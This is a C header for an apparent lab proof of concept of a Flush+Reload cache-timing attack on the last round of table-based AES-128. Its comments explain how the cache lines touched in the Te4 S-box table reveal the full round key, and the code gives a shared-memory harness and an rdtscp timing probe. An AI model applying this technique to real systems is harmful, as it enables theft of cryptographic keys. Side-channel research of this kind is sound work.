#ifndef OST_LR_COMMON_H
#define OST_LR_COMMON_H
// Shared state for the LAST-ROUND union-leak cache attack (recovers the FULL key).
//
// AES-128's final round has no MixColumns: it is SubBytes -> ShiftRows ->
// AddRoundKey(K10), implemented with a byte table Te4 (= the S-box, 256 entries,
// 16 per 64-byte line). That table is touched ONLY in round 10, so -- unlike the
// first round -- the attacker needs NO per-round isolation: it flushes Te4, lets
// the victim run a whole encryption, and probes Te4 to see the union of last-round
// accesses.
//
// For ciphertext byte at position pos:  ct[pos] = SBOX[idx_pos] ^ K10[pos],
// where idx_pos is the Te4 index accessed for that position. Hence
//        idx_pos = INV_SBOX[ ct[pos] ^ K10[pos] ]   and   line = idx_pos >> 4.
// INV_SBOX is a bijection, so the accessed line depends on ALL 8 bits of K10[pos]
// -> the last-round attack recovers the FULL byte (not just the top nibble).
// Recover all 16 bytes of K10, then invert the key schedule to get K0 (the key).
#include <stdint.h>
#include <stddef.h>
#include <x86intrin.h>

#define SHM_OST_LR_NAME "/ost_lastround_shm"

// Real contiguous AES table layout: 256 one-byte S-box entries, 16 per 64-byte
// cache line -> 16 lines, exactly as a software T-table/S-box AES lays it out.
// idx -> Te4[idx]; cache line of idx = idx>>4; probe/flush each line at its head
// (uint8_t*)Te4 + l*64. No page-spreading. On hardware with the adjacent-line /
// stride prefetcher enabled this tiny contiguous table can saturate under Flush+
// Reload (neighbouring lines get pulled back); the literature-standard remedy is to
// disable the HW prefetchers (BIOS or MSR 0x1A4) for the measurement, NOT to change
// the table layout. Probe order is shuffled and serialized to blunt the stride
// prefetcher as far as possible without touching the layout.
typedef struct __attribute__((aligned(64))) {
    uint32_t Te4[256] __attribute__((aligned(64)));  // last-round S-box table (leak target)

    uint8_t key[16];              // victim's AES key (attacker-set ground truth)
    uint8_t pt[16];               // plaintext for this encryption (attacker-set)
    uint8_t ct[16];               // ciphertext the victim produced (known to attacker)

    volatile uint8_t ready;
    volatile uint8_t trig;        // attacker -> victim: do one full encryption
    volatile uint8_t done_ack;
    volatile uint8_t exit_flag;
    volatile uint8_t selftest_ok; // victim's T-table last round matches reference AES
} OstLrShared;

static inline uint64_t ost_measure(volatile uint8_t* p) {
    unsigned int aux;
    _mm_lfence();
    uint64_t s = __rdtscp(&aux);
    _mm_lfence();
    volatile uint8_t v = *p; (void)v;
    _mm_lfence();
    uint64_t e = __rdtscp(&aux);
    _mm_lfence();
    return e - s;
}

#endif
